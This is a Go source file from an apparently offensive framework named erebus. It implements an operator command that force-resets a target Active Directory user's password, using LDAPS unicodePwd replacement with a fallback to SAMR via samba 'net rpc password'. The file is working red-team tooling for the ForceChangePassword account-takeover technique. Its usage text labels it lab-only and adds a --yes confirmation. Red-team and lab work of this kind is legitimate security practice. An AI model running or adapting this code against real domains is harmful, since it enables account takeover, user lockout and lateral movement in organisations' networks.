package preimplant

import (
	"fmt"

	"github.com/KKingZero/erebus-exploit-framwork/pkg/ldapcli"
)

// RunAD dispatches host-side AD set ops (no implant).
func RunAD(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("%s", adUsage)
	}
	switch args[0] {
	case "help", "-h", "--help":
		fmt.Print(adUsage)
		return nil
	case "password", "passwd", "reset":
		return adPassword(args[1:])
	default:
		return fmt.Errorf("unknown ad command %q\n%s", args[0], adUsage)
	}
}

const adUsage = `erebus ad — operator-host AD writes (no implant)

  erebus ad password --dc H --domain D --user U --pass-file P \
      --target jake.h --new-pass-file new.txt --yes [--force]

ForceChangePassword / reset via LDAPS unicodePwd replace (no old password).
Requires --yes. Refuses sAM-prefix passwords unless --force.
LDAPS unicodePwd first; if that fails, SAMR via samba net rpc password
(bind secret in PASSWD_FILE, not argv).
Lab-only. High impact — confirm target. See docs/OPERATOR_PRE_IMPLANT.md
`

func adPassword(args []string) error {
	f, _ := ParseFlags(args)
	opts, err := ldapOpts(f)
	if err != nil {
		return err
	}
	target := first(f, "target", "sam")
	newPass, err := readSecret(f, "new-pass", "new-pass-file")
	if err != nil {
		return err
	}
	if target == "" || newPass == "" {
		return fmt.Errorf("--target and --new-pass-file required")
	}
	if !flagBool(f, "yes") {
		return fmt.Errorf("refusing to reset password for %q without --yes", target)
	}
	force := flagBool(f, "force")
	if !force && ldapcli.ContainsSAMPrefix(target, newPass) {
		return fmt.Errorf("new password contains sAM prefix %q; choose another or pass --force", target)
	}
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return err
	}
	defer conn.Close()
	printProxyHint()
	base := ldapcli.BaseDN(opts.Domain)
	if base == "" {
		return fmt.Errorf("--domain required")
	}
	if err := ldapcli.SetPassword(conn, base, target, newPass, force); err != nil {
		fmt.Printf("LDAP unicodePwd failed: %v\nfalling back to SAMR (net rpc password)\n", err)
		if ferr := samrSetPassword(opts, target, newPass); ferr != nil {
			return fmt.Errorf("ldap: %v; samr: %w", err, ferr)
		}
	}
	fmt.Printf("OK password reset for %s\n", target)
	return nil
}
